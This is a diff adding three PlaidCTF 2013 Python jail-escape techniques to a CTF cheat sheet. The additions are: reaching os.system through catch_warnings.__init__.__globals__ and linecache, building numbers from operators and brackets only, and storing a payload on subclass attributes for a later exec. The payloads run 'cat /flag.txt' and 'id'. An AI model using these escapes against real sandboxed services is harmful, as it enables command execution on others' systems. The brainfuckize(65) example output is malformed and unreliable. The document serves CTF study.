@@ -25,6 +25,9 @@
 - [Server Communication](#server-communication)
 - [Magic File ReDoS](#magic-file-redos)
 - [Environment Variable RCE](#environment-variable-rce)
+- [func_globals → Module Chain Traversal (PlaidCTF 2013)](#func_globals--module-chain-traversal-plaidctf-2013)
+- [Restricted Charset Number Generation (PlaidCTF 2013)](#restricted-charset-number-generation-plaidctf-2013)
+- [Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)](#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013)
 - [Decorator-Based Escape (No Call, No Quotes, No Equals)](#decorator-based-escape-no-call-no-quotes-no-equals)
   - [Technique 1: `function.__name__` as String Keys](#technique-1-function__name__-as-string-keys)
   - [Technique 2: Name Extractor via getset_descriptor](#technique-2-name-extractor-via-getset_descriptor)
@@ -468,3 +471,66 @@ expr = '+'.join(terms)  # e.g., "111...1+111...1+11+1+1"
 | "No words" | Multi-char blocked |
 | "Oracle" | Query functions to leak |
 | "knight/chess" | Mastermind game |
+
+---
+
+## func_globals → Module Chain Traversal (PlaidCTF 2013)
+
+**Pattern:** Access `os.system` through the `func_globals` dictionary of a loaded class's method, without importing any modules.
+
+```python
+# Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)
+[x for x in ().__class__.__base__.__subclasses__()
+    if x.__name__ == "catch_warnings"][0]
+
+# Step 2: Access func_globals via __init__ or __repr__
+g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals
+# Python 2: .__init__.im_func.func_globals
+# Python 3: .__init__.__globals__
+
+# Step 3: Traverse module chain: warnings → linecache → os
+g["linecache"].__dict__["os"].system("cat /flag.txt")
+
+# One-liner:
+().__class__.__base__.__subclasses__()[59].__init__.__globals__["linecache"].__dict__["os"].system("id")
+```
+
+**Key insight:** The `warnings.catch_warnings` class is almost always loaded. Its `__init__.__globals__` contains a reference to `linecache`, which imports `os`. This chain avoids direct `import` statements. The subclass index varies by Python version — enumerate with `[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]`.
+
+---
+
+## Restricted Charset Number Generation (PlaidCTF 2013)
+
+**Pattern:** Generate arbitrary integers using only `~` (bitwise NOT), `<<` (left shift), `[]<[]` (False=0), and `{}<[]` (True=1) when numeric literals are forbidden.
+
+```python
+def brainfuckize(nb):
+    """Convert integer to expression using only ~, <<, <, [], {}"""
+    if nb == -2: return "~({}<[])"    # ~True = -2
+    if nb == -1: return "~([]<[])"    # ~False = -1
+    if nb == 0:  return "([]<[])"     # False = 0
+    if nb == 1:  return "({}<[])"     # True = 1
+    if nb % 2:   return f"~{brainfuckize(~nb)}"  # Odd: ~(complement)
+    return f"({brainfuckize(nb//2)}<<({{}}<[]))"   # Even: half << 1
+
+# brainfuckize(65) → "(~(~([]<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))"
+# Then use: "%c" % 65 → "A"
+```
+
+**Key insight:** Combine with `"%c" % ascii_value` to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.
+
+---
+
+## Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)
+
+**Pattern:** Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.
+
+```python
+# Stage 1: Store code fragment on a subclass
+().__class__.__base__.__subclasses__()[-2].payload = "import os; os.system('cat /flag.txt')"
+
+# Stage 2 (next submission): Retrieve and execute
+exec(().__class__.__base__.__subclasses__()[-2].payload)
+```
+
+**Key insight:** Class attributes persist across separate `eval()`/`exec()` calls within the same process. If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use `IncrementalDecoder` or any persistent subclass as the storage target.
